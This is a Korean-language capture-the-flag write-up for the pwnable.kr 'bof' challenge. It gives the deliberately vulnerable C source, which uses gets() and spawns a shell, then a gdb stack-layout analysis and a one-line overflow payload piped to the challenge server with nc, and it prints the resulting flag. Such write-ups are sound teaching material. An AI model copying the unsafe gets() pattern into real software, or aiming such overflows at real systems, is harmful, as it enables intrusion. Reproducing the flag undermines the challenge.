# Toddler's Bottole - bof  

## 문제 설명  
<img width="449" alt="g" src="https://user-images.githubusercontent.com/46364778/98027442-07158580-1e50-11eb-9668-7288d9870615.PNG">  

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```  


## 문제 풀이  
0. kali 리눅스를 통해 실습을 진행한다.  
> **nc(net cat)**  
> nc는 TCP나 UDP 프로토콜을 사용하는 네트워크 연결에서 데이터를 읽고 쓰는 간단한 유틸리티 프로그램으로 대부분 리눅스에 기본적으로 탑재되어 있다.  
> 일반적으로 UNIX의 cat과 비슷한 사용법을 가지고 있지만 nc는 네트워크에 읽거나 쓰며, 이 명령어를 스크립트와 병용하여 네트워크 디버깅, 테스팅 툴로 사용하며 해킹에도 많이 사용하는 프로그램이다.  

1. 
<img width="179" alt="h" src="https://user-images.githubusercontent.com/46364778/98027748-78553880-1e50-11eb-8290-e99d396712c9.PNG">  

아무거나 입력했는데 이렇게 나옴  

2. 일단 gdb에서 어셈블리를 확인해보자!를하려면 파일이 필요하니 wget 명령으로 받아준다.  
```
wget http://pwnable.kr/bin/bof
```  
하고 gdb 돌리자!  

func() 후에 main이 바로 메모리에 있는 것을 볼 수 있다.  
<img width="313" alt="i" src="https://user-images.githubusercontent.com/46364778/98029210-80ae7300-1e52-11eb-819c-d3d35337e750.PNG">  

3. 이를 토대로 메모리 구조를 대략 파악해보자!  

High
|argv 등|    
|:---:|  
|main ret[4]|  
|main sfp[4]|  
|0xdeadbeef [4인데 16할당]|  
|func ret[4]|  
|func sfp[4]|  
|overflowme[32인데 72할당]|  

Low

4. 정확히 dummy를 파악해보자.  
* ```mov DWORD PTR [ebp-0xc], eax```: func sfp와 overflow 사이에 12bytes dummy가 있을 것이다.
* ```lea eax, [ebp-0x2c]```: gets함수를 호출한 뒤, 그 인자를 가져오는 명령어다. 즉, overflowme를 뜻한다.  
overflowme가 ebp 기준 0x2c == 44bytes 만큼 떨어져 있으므로 12bytes dummy 후에 overflow[32]가 있고 그 후에 28bytes dummy가 있음을 알 수 있다.  
* ```cmp DWORD PTR [ebp+0x8], 0xcafebabe```: 0xcafebabe와 비교하는건 key 인자이다. 즉, key인자가 ebp+8bytes에 있음을 알 수 있다. 즉, func sfp[4] 위에 func ret[4] 그리고 그 위에 바로 0xdeadbeef가 있다는 것이다.  

정리하면,
High
|argv 등|    
|:---:|  
|main ret[4]|  
|main sfp[4]| 
|dummy[12]|  
|0xdeadbeef [4]|  
|func ret[4]|  
|func sfp[4]| 
|dummy[12]|  
|overflowme[32]|  
|dummy[28]|  

Low

+) 그리고 func함수에서 4번의 call 명령(+1은 걍 함수에필로그..?같음)이 보이는데, 차례대로  
printf(), gets(), system(), printf()로 추측이 가능하다.  

5. 여기서 key 값을 0xdeadbeef에서 0xcafebabe로 바꿔주면 된다.  
오버플로우 공격은 overflowme를 입력받는 gets()에서 일어나므로,  

총 52bytes의 padding과 4bytes의 key로 overflow 시키면 된다.  

```
(python -c 'print "\x90"*52+"\xbe\xba\xfe\xca"'; cat) | nc pwnable.kr 9000
```  
> - 실행 파일을 실행하고 입력해줘야하기 때문에 + 쉘이 안꺼지게 세미콜론으로 또 하나의 명령을 준다.  
> - python에 c옵션은 python에서 사용하는 한줄 명령  
> - |: 앞의 출력 결과를 뒤에 실행하는 명령어의 입력으로 보내줌  
> - ()로 묶지 않으면 python 출력 내용에 추가로 데이터를 쓸 수 없다.  

6.  
위 공격코드를 입력하고 나타나는 버퍼에 아무거나 입력해보면,  
```/bin/sh: 1:d: not found``` 뭐 이런 식으로 나온다! 성공했음을 알 수 있음.  

추가로 ```id```를 쳐봐도 uid, gid가 bof로 되어있음을 알 수 있다.  
flag를 얻어내기 위해 ```ls```를 해보자.  
파일 목록 중에 flag라는게 있다. ```cat flag```  

플래그는 ```daddy, I just pwned a buFFer :)```  


